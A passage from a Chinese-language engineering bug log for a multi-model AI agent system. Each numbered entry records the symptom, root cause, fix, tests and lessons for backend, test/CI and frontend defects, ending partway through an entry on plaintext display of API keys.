2. **`conscience._last_analyzed_node_ids` 是全局单例可变状态**（§49 同类）：多会话并发 think 时互相覆盖，analyze_feedback（fire-and-forget 异步）可能用错会话的节点调整因果图置信度。

**修复：**
- 新增统一人设入口 `settings.get_role_persona(role)`：用户自定义 `personas.yaml personas[role]` → 自定义 agent（personality+风格+擅长）→ `roles.yaml` 内置 → 空。`conscience._build_role_context` 改用它——**对话与心理活动同源，改一套人设同时生效**（心理活动仍只取人设文本，不含工具段）
- `_compose_persona` 兼容 expertise 为逗号字符串（拆列表）
- 反馈闭环节点集合按 session 隔离：think 结束时把本轮节点**快照**到 `_pending_feedback_by_session[session_id]`，`analyze_feedback(owner_id=session_id)` 用对应会话快照，用完清理；直接调用（测试）回退 `_last_analyzed_node_ids`（向后兼容）

**内存安全：**
- `Conscience` 新增 `clear_session()` / `clear_all_dialogs()`（会话删除时释放对话缓存，防无界增长）
- 新增 `tests/leak/test_leak_conscience_dialogs.py`（每会话有界 20 条 + 会话可清理 + 大量会话可整体清空）和 `tests/leak/test_leak_client_rebuild.py`（client 配置指纹重建时旧 aiohttp session 被 close，防泄漏）

**验证：** 统一人设防御测试 8 项 + 反馈池隔离测试 + leak 12 项 + 相关 329 项通过。

**教训：** ① "改一处人设，两处生效"必须统一读取入口（用户自定义优先 + 内置回退），而不是让各消费方各读各的源；② 全局单例的可变状态（哪怕是瞬态的"本轮分析节点"）在多会话并发下也会串——**快照按 session 存**是标准解法；③ 新增有界/可清理的状态（对话缓存）要配套清理方法 + 泄漏测试。

---

## 43. 文件感知功能实际无效 —— 采集端与消费端管道断（后端）

**现象：** 修改项目根文件后，感知池仍返回"当前无感知数据"——文件变化从未进入模型上下文。

**根因：** `FileDifferenceSource.detect()` 只产生 `Difference`（供 detector 存储/高强度回调），**从不发布 `FILE_CHANGE` 感知事件**；感知池订阅了 `FILE_CHANGE` 但**没有任何发布者**。且 `file_modified` intensity 25 < 阈值 50，也不触发 high_intensity 回调。采集端（检测到差异）与消费端（感知池→模型）之间的管道是断的。

**为什么没被测试发现（系统性盲区）：**
- 单测验证组件各自正确：`detect()` 返回 Difference ✓ / detector 注册 ✓ / integration 格式化 ✓——但**组件间的"数据管道"（谁把 Difference 发布成感知事件）无人测**
- 模块覆盖清单只证明"被 import 执行"，不证明"数据到达消费者"
- 这是 §42（感知注入消费端断）的同类模式——生产端也断

**处理：** 删除文件感知功能（采集端本无真实发布者，链路不完整）：
- 删除 `FileDifferenceSource` 模块 + `test_file_source_ext.py`
- detector 移除注册；integration 移除 FILE_CHANGE 订阅/格式化
- settings 移除 `PERCEPTION_FILE_ENABLED`；前端设置页移除文件监控开关
- 相关 mock 测试更新（test_difference_detector / test_perception_integration_ext）

**防再犯：** 补感知数据链路端到端测试（真实发布事件 → 感知池 → collect → 断言内容），任何"采集正常但管道断"都会被捕获。

## 57. thinking 模式 tool loop 报 400：assistant 消息未回传 reasoning_content（后端）

**现象：** 代码主管（code_supervisor）多轮工具调用时报错：
`400 - The reasoning_content in the thinking mode must be passed back to the API.`（provider: Console Go / DeepSeek thinking 模式）

**根因：** `modules/thinking/core/model_runner.py` 工具循环里，构造**声明 tool_calls 的 assistant 消息**（`messages.append(ChatMessage(role="assistant", content=None, tool_calls=all_result_calls))`）时**没有带上本轮的 `reasoning_content`**。thinking 模式下，assistant 消息一旦生成了 reasoning，后续请求必须原样回传（`_messages_to_api` 里 `if m.reasoning_content: msg["reasoning_content"]=...` 才能回传）。历史里该 assistant 消息 reasoning_content 为 None → 不回传 → 下一轮请求 400。

**修复（model_runner.py 1740 附近）：** 构造 tool_calls 的 assistant 消息时补 `reasoning_content=getattr(response.message, "reasoning_content", None)`——thinking 模式回传，非 thinking 模式为 None 不影响。

**验证：** model_runner / large_model_client 相关 314 项测试通过。

**教训：** thinking 模式（Reasoner）的多轮工具调用，**assistant 消息必须完整保留并回传 `reasoning_content`**（与 `tool_call_id`/`tool_calls` 同等重要）——任何"构造 assistant 消息"的地方都不能丢它，否则跨轮请求被 provider 拒绝。排查此类 400 的口诀：历史里 assistant 是否带 reasoning_content + `_messages_to_api` 是否回传。

## 58. CI 全量下 socket/子进程测试 20s 超时误杀（测试/CI）

**现象：** CI 全量（5875 测试 / 10 分钟）偶发 `test_screen_capture_daemon.py::test_bind_stale_retry` `Timeout (>20.0s)` + 下一个测试 `previous item was not torn down properly`（连锁）；此前 `test_runtime_expert_ext` 也有同类 Timeout。本地单独/小范围跑全部通过（test_bind_stale_retry call 仅 0.01s）。

**根因：** `pytest.ini` 的 `--timeout=20` 对**全量负载**下的调度/导入延迟过紧——单测本身毫秒级，但 CI 机器跑 10 分钟 5875 测试时资源紧张，pytest 从测试开始到结束（含 setup/导入/调度）可能超过 20s → 被 pytest-timeout 误杀；被杀后 monkeypatch teardown 未跑 → 下一个测试报 "not torn down properly"。

**修复：**
- `pytest.ini`：`--timeout=20` → `--timeout=60`（给全量负载留余量；项目单测本地最长 ~21s，60s 不会掩盖真死锁太久）
- `test_bind_stale_retry` / `test_run_exits_when_bind_none`：socket 路径从全局 `/tmp/x.sock` 改为 `tmp_path` 隔离（防全量下真实 socket 文件残留冲突）

**验证：** screen_capture_daemon + runtime_expert 67 项通过。

**教训：** `pytest-timeout` 阈值要按**最坏情况（CI 全量负载）**设，不能按本地单测耗时——毫秒级测试在全量下也会因调度/导入延迟超时。这类"单测快、全量误杀"优先放宽超时，而非改测试逻辑。

## 59. delegate_task 的 wait_seconds 解析后未传递 —— 上级设置的下级超时恒走 300s 兜底（后端）

**现象：** 要求"让上一级大模型自主设置下级思考超时"后，`delegate_task` 工具已把 `wait_seconds` 标为 required，但运行时上级设置的值**从未生效**——下级 runner 的思考超时恒为 `DEFAULT_DELEGATE_THINK_TIMEOUT=300`。

**根因：** `model_runner._generate_with_tools` 的 delegate_calls 分发处只解析了 `role`/`task`，**没有把 `args["wait_seconds"]` 传入 `DelegationRequest`**（delegation_port.py:24 字段恒为 None）；`ProbeDelegationAdapter.delegate` 收到 None 后走兜底分支（且只在缺省时打 warning）。工具 schema 声明"必填+生效"，但解析到使用之间断链。

**修复（commit `16bd27e`）：** delegate_calls 分发处解析 `wait_seconds`（clamp 1-600）→ `DelegationRequest.wait_seconds` → probe_started `think_timeout` → `_handle_probe_started` → `start_runner(think_timeout)` → `runner.THINK_TIMEOUT`（委托场景覆盖，非委托用默认）。

**验证：** `test_delegate_think_timeout_passed` / `test_delegate_think_timeout_fallback`；相关 288+ 通过。

**教训：** "工具参数声明必填"不等于"参数真正生效"——**解析 → 传递 → 消费**三步必须连测。此模式（schema 声明与实际传递断链）是同类 bug 高发区，排查时搜工具名参数在解析处之后是否真的被使用。

## 60. think_once 外层 120s 嵌套覆盖 runner 的 THINK_TIMEOUT —— 上级设置的超时被内层吞掉（后端）

**现象：** 即使 §59 修好 `wait_seconds` 传递，上级给下级设的超时（如 300s）依然不生效——单次思考总是在 120s 就结束。

**根因：** 双层 `pausable_wait_for` 嵌套：`think_once` 外层 `timeout=SINGLE_THINK_TIMEOUT=120`（continuous_thinker.py:32）包裹整个 `think_fn`（即 `runner._generate`），而 runner 内部 `timeout=self.THINK_TIMEOUT`（300）。**外层 120s 先到 → 取消内层 → 上级设置的 300s 永远到不了**。嵌套超时取"较小者"，而非外层的"上限"。

**修复：** `think_once` 改用 `getattr(runner_ref, "THINK_TIMEOUT", None) or SINGLE_THINK_TIMEOUT`——上层超时与 runner 的超时对齐（上级委托设置的值真正生效）；超时重试分支的日志/error 同步用动态 `_timeout`。

**验证：** 相关 609 项通过。

**教训：** 多层 `wait_for`/超时包裹时，**外层超时若小于内层，内层永远不触发**（实际超时 = 最小嵌套值）。设置"可配置超时"时要检查所有包裹层，确保没有任何一层比被配置值更小。

## 61. 委托链不可重建 + 超时后思考上下文丢失（后端）

**现象（两个相关的结构性缺陷）：**
1. **委托链无法重建**：`delegation_id` ≡ `task_id`（沿整条链共享，无法区分层级）；`probe_id` 每次委托唯一但只存进程内 `_probe_map`，不随消息传播；黑板 `delegations` 生产代码从不写入（`write_delegation` 无生产调用者）；`_pending_delegations` 以 `task_id` 为 key 且每次 `continuous_think` 清空，多次委托互相覆盖。
2. **超时后思考丢失**：工具循环的 `messages` 只在内存，超时/中断终止后丢失；`_save_partial_result` 只保存部分输出**文本**（history_thoughts + streaming），不是可恢复的 messages 断点。

**根因：** 委托追踪用的唯一标识选择错误（复用 task_id）+ 委托链数据从未落库；断点快照从未设计（超时=从头重试）。

**修复（commit `16bd27e`）：**
- `Delegation` 扩展为链节点（`caller/return_to/parent_delegation_id/child_delegation_ids/origin_task_id/probe_id/target_model_id/progress/context_summary`），`delegation_id` 用每次委托唯一的 `probe_id`
- `delegate_task` 分发时 `_record_delegation_chain` 写入黑板并随黑板按 `(session_id, blackboard_id)` 落库；`probe_started` 传播 `parent_delegation_id`/`origin_task_id`；`thinking_result` 回写状态/结果
- 工具循环每轮 `_save_resume_context` 保存 messages 断点（runner + 黑板 + 落库）；`think_once` 超时重试 `_request_resume` → runner 从断点续思考（`_resume_context` 重建 messages + "从中断处继续"指令）
- `ChatMessage/ToolCall` 加 `to_dict/from_dict`；黑板加 `persist/load`

**验证：** 委托链黑板测试 7 项 + 断点续思考测试 3 项 + 相关 938+ 通过。

**教训：** ① 链路追踪必须用**每次实例唯一的 ID**（probe_id），不能复用沿链共享的标识（task_id）；② "超时后如何继续"必须在设计期决定（断点快照），否则超时=全部从头重来；③ 委托这类跨模型状态必须落库（随黑板按 session 持久化），进程内临时表无法支撑跨重启/跨层查询。

## 62. thinking_result 两处生产路径 delegation_id 语义不一致 —— RuntimeExpert 路径用 task_id，黑板委托链查不到（后端）

**现象：** on_demand 专家（RuntimeExpert，如 SecurityMonitor）完成后，上级 `query_delegation` 查不到该委托的结果/状态更新——委托链一直停在"已委托"。

**根因：** §61 修复后，`continuous_thinker._notify_return_target` 发送的 thinking_result 用 `delegation_id = runner._delegation_id`（**probe_id**，黑板委托链 key）；但 `model_runner._run_runtime_expert` 的唤醒路径（model_runner.py:367 附近）仍写 `"delegation_id": self._task_id`（**task_id**）。两处生产路径发送同一消息字段但语义不同 → 上级 `_wait_for_wakeup_event` 用 delegation_id 回写黑板 `get_delegation()` 永远找不到（task_id 不是黑板 key）→ RuntimeExpert 委托的状态/结果不落黑板。

**修复：** `_run_runtime_expert` 唤醒消息改为 `"delegation_id": self._delegation_id or self._task_id`（优先 probe_id），并补 `"task_id": self._task_id`（供上级 `_pending_delegations` 按 task_id 匹配）。与 `_notify_return_target` 路径对齐。

**验证：** `test_runtime_expert_thinking_result_uses_probe_id`（断言 delegation_id=probe_id 且 task_id 存在）；相关 145+ 通过。

**教训：** 同一消息字段**多生产路径**时，字段语义必须一致——修一处必须全仓排查所有发送点（grep `action: thinking_result` / `"delegation_id"`），否则部分链路（本例 RuntimeExpert）静默失效，且无报错、只在 query_delegation 时表现为"查不到"。

## 63. start_runner 委托节点记录覆盖 delegate 分发记录 —— 委托角色名被 identity.role 替换（后端）

**现象：** 端到端测试发现，`delegate_task` 分发时 `_record_delegation_chain` 已用**角色显示名**（如"代码实现专家"）记录委托；随后 manager 消费 probe_started → `start_runner` 又用 `identity.role`（如 `code_writer`）**覆盖了同一 probe_id 的委托节点** → 委托链里角色变成英文标识，`query_delegation` 展示的角色名丢失。

**根因：** 同一委托节点有两个记录点（delegate 分发 + probe 激活），后者用 `write_delegation` 无条件覆盖前者（同一 probe_id 为 key）。

**修复：** `start_runner` 记录委托节点前先检查 `bb.delegations` 是否已存在该 probe_id——存在则只补全 `target_model_id`（通过 `update_delegation_progress`），不覆盖 role/task/caller；仅 orchestrator 直启等缺失场景才 `write_delegation`。

**验证：** `tests/integration/test_thinking_e2e.py::test_delegation_chain_full_flow` 断言委托链 `role=代码实现专家, caller=large_primary_001, parent=probe_user_input, status=replied`；相关 79+ 通过。

**教训：** 同一业务实体（委托节点）有两个写入源时，必须明确"谁优先/谁补充"，否则后写者静默覆盖前者。

## 64. 断点续思考的"从中断处继续"指令在多次超时重试下累积（后端）

**现象：** 端到端审查发现，`think_once` 超时重试（MAX_THINK_RETRIES）时每次 resume 都往 messages 追加"从中断处继续" system 指令；断点快照更新后再次 resume 会再插一条 → 上下文膨胀 + 指令重复。

**根因：** resume 分支无条件 `messages.append(...)`，未检查断点里是否已含该指令。

**修复：** resume 分支先扫描断点 messages 是否已含"从中断处继续"（`has_resume_marker`），有则跳过插入。

**验证：** 相关 503+ 通过。

**教训：** 幂等性——任何"断点恢复/续跑"逻辑注入标记指令前，先检查是否已注入过；多次恢复同一断点不能重复追加。

## 65. 黑板 final_response 设置后未落库 —— 重启后最终回复丢失（后端）

**现象：** 端到端验证黑板快照时发现，`blackboard.persist()` 只在断点保存/委托链记录时调用；`final_response` 作为终态在 `set_final_response` 设置后从不落库 → DB 快照的 `final_response` 恒为 None。

**根因：** 持久化时机覆盖不全——只覆盖了"过程态"（断点/委托），遗漏了"终态"（最终回复）。

**修复：** `CognitiveBlackboard.set_final_response` 末尾调用 `self.persist()`（失败不阻塞），保证最终回复落库可恢复。

**验证：** `test_delegation_chain_full_flow` 断言 `state["final_response"] == blackboard.final_response`；相关 503+ 通过。

**教训：** 黑板持久化要覆盖"终态"字段（final_response 等），不能只持久化过程态；写终态的方法本身应触发落库。

## 66. 测试直接篡改全局单例 ToolRegistry._tools —— 全量 CI 69 个失败（测试污染）

**现象：** CI 全量跑出 69 个失败：`toolgate`/`tool_visibility`/`tools_search`/`tool_registry_ext` 报 `'_T' object has no attribute 'risk_level/category/enabled/...'`，本地单文件测试却全部通过。

**根因：** 我新增的 `test_tool_permission_ext.py::test_get_base_whitelist_star` 为了测 `*` 展开逻辑，直接执行 `tr.ToolRegistry._tools = {含缺字段的 _T 对象}` **篡改了全局共享单例**。全量运行时，`test_toolgate` 等读取 `ToolRegistry._tools` 读到残留的 `_T` 对象（缺 risk_level/category 等字段）→ AttributeError。单文件测试通过是因为 `_T` 污染只在**跨文件执行顺序**下被其他测试读取才暴露。

**修复：**
1. 用 `monkeypatch.setattr(ToolRegistry, "_tools", {...})` 隔离——pytest monkeypatch 在 **teardown 自动恢复**，不污染全局，且不依赖真实注册工具。
2. （关联）`read_context` 工具误加入所有 tier 基础工具，导致 `test_get_control_tools_expert` 失败 → 移回 large/supervisor 委托组。

**验证：** CI 同规模全量 `tests/unit` 6036 passed（原 69 failed → 0）。

**教训：** ① 测试**绝不要直接对全局共享单例的内部状态赋值**（`ToolRegistry._tools`、`_runner_managers`、`_session_memory_context` 等）——要隔离就用 `monkeypatch.setattr`（自动恢复）或真实 API + cleanup；② 单文件全过 ≠ 测试安全，这类"全量跨文件顺序才暴露"的污染必须全量回归；③ mock 对象缺字段（`_T`）是"读到被篡改的全局状态"的典型信号。

## 67. 新增控制工具 read_context 误加入所有 tier —— expert 权限越权（后端/测试）

**现象：** `test_get_control_tools_expert` 失败：expert 的 control tools 多出 `read_context`。

**根因：** 在 `tool_permission_controller.get_control_tools` 里把 `READ_CONTEXT_TOOL` 放进了 `tools = [CONTINUE_THINKING_TOOL, QUERY_TOOL_DETAILS_TOOL, READ_CONTEXT_TOOL]` 基础工具列表——**所有 tier 共享**。但 `read_context` 是读取黑板记忆/委托上下文，expert 无记忆读取需求，不应暴露。

**修复：** 把 `READ_CONTEXT_TOOL` 移到 `if delegation_available and tier in ("large", "supervisor")` 委托组（与 query/resume_delegation 同级）。

**验证：** `test_get_control_tools_expert` 恢复；tool 相关 144 passed。

**教训：** 新增控制工具要按 tier 权限**显式归类**（基础/委托/大模型专属），不要无脑塞进共享基础列表；expert 只暴露最小必要工具。

## 68. todo 面板 3 秒轮询 —— 改 WS 事件推送 + 按需拉取（前端/后端）

**现象：** 前端 todo 面板用 `setInterval(loadTodos, 3000)` 轮询拉取，模型更新 todo 后最多延迟 3 秒才显示；且轮询每 3 秒发一次请求，空闲会话也持续消耗。

**根因：** todo 工具（模型调用）在 `model_runner._generate_with_tools` 通过 MCP 执行后，前端无感知——只能靠轮询主动拉取，架构是"拉"而非"推"。

**修复（架构调整：轮询 → 推送 + 按需调用）：**
- 后端：`model_runner` 新增 `_push_todo_update()`，todo 工具执行成功后通过 `connection_manager.send_json_from_thread` 推送 `type='todo', event='todo_changed'` WS 事件（含 session_id）
- 前端：`Chat.vue` 注册 `wsClient.on('todo', _onTodo)`（onMounted）→ 收到事件**按需**调用 `loadTodos()`；移除 3 秒轮询 `setInterval`；`_onTodo` 按 session_id 过滤（其他会话的推送不刷新当前）

**持久化（未改，已合理）：** todo 工具调用即写 `~/.cortex/todos/{session_id}.json`（`_save_todos`），按会话隔离，切换会话不丢。

**验证：** 后端 `test_push_todo_update` + `test_todo_tool_execution_triggers_push`；前端 `_onTodo` 两个用例（触发刷新/其他会话忽略）；前端 497 + 后端相关全过。

**教训：** ① 前端"实时状态"优先用**事件推送**而非定时轮询——有 WS 通道就该推送 + 按需拉取，避免无效轮询；② 推送事件要带 `session_id` 并在前端按会话过滤，否则多会话串扰；③ todo 这类持久化状态，模型工具调用即写盘是正确范式，无需额外同步。

## 69. 前端上下文占用显示偏低 —— context_tokens 未计入工具调用历史（后端）

**现象：** ThinkingStatusPanel 显示的上下文占用百分比偏低，与真实消耗不符。

**根因：** `model_runner._generate_with_tools` 只在**进入工具循环前**估算一次 `_thinker._context_tokens = engine.estimate_tokens(system + tools + user_prompt)`（model_runner.py:2023），工具循环内**每轮累积的 messages（tool_calls + tool 结果）不计入**。而 `_maybe_summarize_context` 内部算了 messages token（用于判断 90% 总结阈值），但没同步回 `_context_tokens` → 前端显示的是初始 prompt 占用，不是实时累积。

**修复：** `_maybe_summarize_context` 每轮把 messages 估算的 token 同步写回 `self._thinker._context_tokens`（无论是否触发总结），前端展示含工具历史的真实占用。

**验证：** `test_maybe_summarize_syncs_context_tokens`；前端 ThinkingStatusPanel 上下文 warn(70%)/danger(90%)/100%封顶/无数据隐藏测试。

**教训：** ① "估算一次"若用于展示累计状态，必须覆盖完整累积范围（含工具历史），否则展示值失真；② token 估算的更新点要与"真实消费点"（messages 增长处）对齐，不能只在初始化处算一次；③ 前端展示字段（context_tokens）要由后端维护一个**权威实时值**，前端只管渲染。

## 70. 模型调用失败：'NoneType' object is not iterable —— SSE 流 delta.tool_calls 为 null（后端）

**现象：** 工具循环中模型调用报 `[模型调用失败: 'NoneType' object is not iterable]`，思考中断。

**根因：** `large_model_client._parse_openai_stream` 用 `for tc_delta in delta.get("tool_calls", [])` 迭代工具调用增量。DeepSeek reasoning 模式流式返回时，**思考阶段 `delta.tool_calls` 字段存在但值为 `null`**——`dict.get(key, [])` 在键存在但值为 None 时返回 **None**（不是默认 `[]`），`for ... in None` → `'NoneType' object is not iterable`。

**修复：** `for tc_delta in (delta.get("tool_calls") or [])` —— 用 `or []` 同时兜底"键缺失"与"值为 null"两种情况。

**验证：** 新增 `test_openai_stream_tool_calls_null_safe`（tool_calls:null 混入文本+后续工具调用）+ `test_openai_stream_tool_calls_key_missing`；large_model_stream 9 passed + 相关 274 passed。

**教训：** ① `dict.get(key, default)` 只在**键缺失**时返回默认值，**键存在但值为 None** 时返回 None——对可能为 null 的字段要用 `get(key) or default`；② SSE 流解析对 provider 的字段空值（null/缺省）都要容忍，DeepSeek reasoning 的 tool_calls 思考阶段为 null 是常态；③ 排查 "X is not iterable" 优先搜 `for x in dict.get(...)` 模式。

## 71. 切换会话后出现多余的独立"思考"气泡（前端）

**现象：** 切回某会话后，原本在会话窗口不显示的多个"思考/思考/思考"框冒出来（重复的 `kind: 'thinking'` 气泡）。

**根因：** 会话切换恢复（loadHistory）与运行时思考展示**两条路径行为不一致**：
- **运行时**：大模型思考累积到 `pendingThinking`，最终折叠进回复框（`consumeThinking`），**不独立成消息**
- **恢复时**：持久化的 `role='thought'` 消息被逐条渲染为独立 `kind: 'thinking'` 气泡（含"思考"徽标），多轮思考 → 多个"思考"框

后端把连续思考的每一轮都持久化为 `role='thought'`，恢复时全部变成独立气泡，视觉上与运行时严重不符。

**修复（loadHistory）：** 大模型（非 supervisor/expert）的 thought 改为**累积到 `pendingLargeThinking`，聚合到紧随其后的 assistant/large 回复的 `_thinking` 思考区**（与运行时折叠一致）；无后续回复的累积丢弃。工具调用仍进 traces、supervisor/expert 仍聚合为独立专家气泡（不变）。

**验证：** 更新原测试（大模型 thought 不再独立成 thinking 气泡）+ 新增"thought 聚合到回复思考区而非独立气泡"用例；前端 498 全过。

**§71 补充（同类 bug 排查发现属性名不一致）：** §71 初次修复把恢复的思考写入 `msg._thinking`，但组件普通消息分支读 `message.thinking`（`ChatMessage.vue:209/211`）——恢复后思考仍不可见（store 测试断言 `_thinking`、组件测试断言 `thinking`，各自通过互不覆盖）。已改为写入 `msg.thinking`（与运行时 `Chat.vue:191` 一致）。

**教训：** ① 同一状态的**运行时展示路径与恢复路径必须一致**——恢复（loadHistory）要复用运行时的聚合逻辑（pendingThinking 折叠），而不是另写一套渲染；② 持久化的每条"思考步骤"不等于一条"消息"，恢复时要按运行时的分组规则聚合，否则切换会话后 UI 与实时不一致；③ 修复此类问题要同时更新"断言旧行为"的测试，否则测试仍固化错误的展示方式。

## 72. 运行时与恢复路径不一致（同类排查）—— 专家气泡数量/思考区属性名（前端）

**现象：** 排查 §71 同类 bug（运行时展示路径 vs 会话恢复路径不一致）时发现两处：

1. **专家气泡数量不一致（HIGH）**：运行时 `addExpertMessage` 每个 supervisor/expert 事件**新建一条气泡**（无同 tier 去重）→ 一轮工作产生多条；loadHistory 恢复却聚合为一条 → 切换会话后专家气泡数量/内容不同。
2. **§71 属性名不一致（HIGH）**：恢复写 `msg._thinking`，组件普通消息分支读 `message.thinking` → 恢复后大模型思考不可见（store 与组件测试各测各的属性，互不覆盖）。

**根因：** 运行时与恢复各写一套逻辑，属性名/聚合规则未对齐。

**修复：**
- `addExpertMessage` 同 tier 复用已有气泡（`_expertBubbles` map）：更新 content + 合并思考/工具，与恢复的"聚合为一条"一致
- 恢复的大模型思考改写入 `msg.thinking`（与运行时 `addMessage({thinking})` 一致）

**验证：** 新增"同 tier 复用"与"不同 tier 独立"用例；前端 500 全过。

**教训：** ① 运行时与恢复**必须共享同一套展示规则**（属性名、聚合策略），否则切换会话 UI 与实时不一致且测试互不暴露；② 两个测试文件（store/组件）分别断言 `_thinking` 与 `thinking`，恰好掩盖了属性名断裂——跨层测试要验证"store 写入字段 = 组件读取字段"；③ 同类 bug 排查要逐类对比"运行时事件处理"与"loadHistory 恢复映射"，找属性名/数量/内容三方面的不一致。

## 73. 恢复路径工具 trace 双份 + 审批文本污染思考区（前端/后端，§71 同类）

**现象：** 排查 §71 同类 bug（运行时 vs 恢复不一致）时的两个 MED 问题：

1. **工具 trace 双份入账**：supervisor/expert 的工具 trace 在恢复时既进 expert 气泡 `_tools`（预扫描 expertAgg），又进全局 `traces`；运行时只进 expert `_tools`（`addExpertTool`）。→ 恢复后运行轨迹多出重复项。
2. **审批/提问文本污染思考区**：security 事件（"等待用户审批"/"user_intent_request"）持久化为 `role='thought', tier='thinking'`，恢复时折叠进大模型回复的思考区——瞬态交互文本变成历史"思考"内容，误导。

**修复：**
- MED-1：恢复时 supervisor/expert 的工具 trace 只进 expert `_tools`（`tier!=='supervisor'&&tier!=='expert'` 才进全局 traces）
- MED-2：后端 `_persist_thought` 对 `event_type=='security'` 用 `tier='security'` 持久化；前端恢复时 `tier==='security'` 的 thought 跳过（不折叠进思考区、不作历史气泡）

**验证：** 新增"expert 工具 trace 不重复进全局 traces"+"security tier 跳过"用例；前端 501 + 后端 api_stream 180 全过。

**教训：** ① 同一数据在恢复时的多条路径（expert 聚合 + 全局 traces）要防重复入账，运行时进哪条恢复就进哪条；② 瞬态交互事件（审批/提问）不应作为历史"思考"持久化或展示——要么不持久化，要么用独立 tier 标记并在恢复时跳过；③ 跨端修复要同步（后端持久化 tier 标记 + 前端识别）。

## 74. 架构根治：运行时与恢复路径共用同一分类规则（前端重构）

**背景：** §71-73 连续发现运行时展示路径与 loadHistory 恢复路径不一致（思考折叠/专家气泡数量/属性名/工具 trace 双份/审批污染），每次都是"运行时改一处、恢复改一处"的补丁式修复。根因：两套独立实现，属性名/聚合规则未对齐。

**架构重构（根治）：**
- **新增 `classifyThinking(d)` 纯函数**：统一分类规则（security 跳过 / approval / intent / tool_trace / expert / thinking），运行时 WS 事件与 loadHistory 恢复**共用它**——分类规则唯一，从根源杜绝不一致
- **新增 `dispatchThinking(d)`**：运行时 WS 事件分派器（调 classifyThinking + 按类别执行 addApproval/addIntent/addExpertThinking/addExpertMessage/addThinkingStep/traces）
- **Chat.vue `_onThinking`** 改为调 `chat.dispatchThinking(d)`（运行时也走统一分类）
- **loadHistory** 改为用 `classifyThinking` 分类持久化消息并按类别累积（专家聚合/大模型思考折叠/工具轨迹/security 跳过）——不再维护独立映射逻辑

**验证：** 新增架构一致性测试（classifyThinking 分类规则 + dispatchThinking 输出/推理分流 + 工具 trace 归类）；前端 504 全过。

**教训：** ① 展示规则（"某数据 → 哪种 UI"）应抽成**单一纯函数**，运行时与恢复都调用，而非各自实现——这样分类永远一致，属性名/聚合策略天然统一；② 恢复不是"另写一套渲染"，而是"把持久化数据按同一规则重放/累积"；③ 架构层根治优于反复补丁——补丁只修当前不一致点，架构统一从源头消除整类问题。

## 75. AI 输出序号（有序列表）超出气泡边界（前端样式）

**现象：** AI 输出带序号的内容（markdown 有序列表 `1. 2. 3.`）时，序号/长内容渲染后超出气泡边界，撑破 `message-bubble`。

**根因：** `.message-bubble`（`frontend/css/components.css`）有 `max-width: 100%` 但**缺 `min-width: 0` 和 `overflow-wrap: break-word`/`word-break: break-word`**。作为 flex 容器 `.message-body` 的子项，flex 子项默认 `min-width: auto` 阻止收缩，遇到无法换行的长 token（序号列表）就溢出气泡。

**修复：**
- `.message-bubble` 加 `min-width: 0; overflow-wrap: break-word; word-break: break-word;`
- 新增 `.message-bubble ol/ul/li` 换行保护（`overflow-wrap`/`word-break`）+ 列表缩进样式（`list-style: decimal/disc`）

**验证：** ChatMessage 21 测试 + 前端构建通过。

**教训：** flex 布局里的气泡子项必须显式 `min-width: 0` 才允许收缩换行；长内容（序号列表/URL/代码标识符）要靠 `overflow-wrap: break-word` 兜底，否则会撑破固定 max-width 容器。CSS 溢出类问题常被"只测逻辑不测样式"的测试忽略，需在真实宽度的渲染下人工核对。

## 76. 长时间挂机后："Task was destroyed but it is pending!"（asyncio Event.wait 残留，后端）

**现象：** 挂机数小时后日志大量出现：
```
Asyncio error without exception: {'message': 'Task was destroyed but it is pending!',
  'task': <Task pending ... coro=<Event.wait() running at locks.py:213> wait_for=<Future pending cb=[Task.task_wakeup()]>>}
```
Task 编号（Task-3838/4022/4214/4386/4572/4755...）随对话逐次递增，即**每次对话**产生一个残留的 `Event.wait()` task，关闭事件循环时被销毁报错。

**根因：** `modules/thinking/multi_model_orchestrator.py` 等待大模型完成信号时用了
`asyncio.wait_for(asyncio.shield(done_event.wait()), timeout=POLL_INTERVAL)`。
`asyncio.shield` 会创建**独立的内部 task** 包裹 `done_event.wait()`，外层 `wait_for` 超时取消时，**shield 防止取消传播到内部 task**，于是内部 `Event.wait()` 继续挂起。每次对话都这样残留一个 pending task，挂机久了积累大量未完成 task，事件循环关闭时触发 "Task was destroyed but it is pending!"。

**修复：** 去掉 `asyncio.shield`，直接用 `asyncio.wait_for(done_event.wait(), timeout=POLL_INTERVAL)`。
`done_event.wait()` 只是等待信号，超时后下次循环重新 await 即可（`done_event` 已 set 则立即返回），无需 shield 保护。
（`model_runner.py:211/3270` 的 shield 用于关闭时等待长期后台任务正常结束，属正确用途，未改动。）

**验证：** `test_multi_model_orchestrator_ext.py::test_wait_large_no_shield_task_leak`（wait_for 超时后无残留 pending Event.wait task）+ `test_wait_large_done_event_set_returns`；orchestrator 相关 213 测试通过。

**教训：** `asyncio.shield` 是"延迟取消"而非"不取消"——被 shield 的内部 task 在事件循环关闭时仍可能 pending。对只需"等待信号、超时重试"的 `Event.wait()`，直接 `wait_for` 即可，不要 shield；shield 只应用于确实需要与调用方生命周期解耦的长期任务。

## 77. 授权设置页冗余的 API Key 手动输入（前端，安全暴露反模式）

**现象：** "授权设置" tab 有一个"API 密钥"手动输入框（`X-API-Key`，由后端 `SIMPLE_API_KEY` 控制），可保存/清除密钥。

**根因：** 设计冗余。前端启动时 `autoDetectApiKey()` 已从 `/config/api-key` 自动拉取密钥（开发/测试直接返回明文；生产仅回环客户端返回明文，其余只返回 `configured` 状态）。手动输入框只对"生产 + 非回环客户端"这一边缘场景有意义，其余场景完全无用；且它把安全密钥暴露成前端入口，属安全反模式。

**修复：** 移除授权设置 tab 的 API 密钥输入区（`keyInput`/`saveKey`/`clearKey`），保留 `autoDetectApiKey`/请求头携带逻辑。授权设置 tab 仅保留运行时配置表。

**验证：** Settings.spec.js 删除 3 个依赖该 UI 的测试、改写 1 个 tab 测试；50 个前端测试通过；重新 `npm run build` 后 dist 中无 `key-input`/`输入 X-API-Key` 残留。

**教训：** 凡"自动检测/自动恢复已覆盖"的配置，前端不要再留手动入口——既冗余又扩大攻击面。检查同类：见 §78、§79。

## 78. 授权设置 tab 运行时配置表明文展示模型 API Key（前端，§77 同类）

**现象：** 授权设置 tab 的"运行时配置"表把 `configStore.config` 全部可改配置项逐行渲染 `String(v)`，包括 `LARGE_MODEL_API_KEY`/`MEDIUM_MODEL_API_KEY`/`SMALL_MODEL_API_KEY`/`PERCEPTION_VOICE_API_KEY`/`OUTPUT_TTS_API_KEY`/`VISION_API_KEY` 等密钥明文。

